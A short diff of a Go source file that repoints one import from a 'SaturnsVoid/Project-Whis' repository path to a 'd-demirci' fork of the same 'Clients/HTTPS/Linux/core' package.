@@ -5,7 +5,7 @@ import (
 	"math/rand"
 	"time"
 
-	"github.com/SaturnsVoid/Project-Whis/Clients/HTTPS/Linux/core"
+	"github.com/d-demirci/Project-Whis/Clients/HTTPS/Linux/core"
 )
 
 func init() {
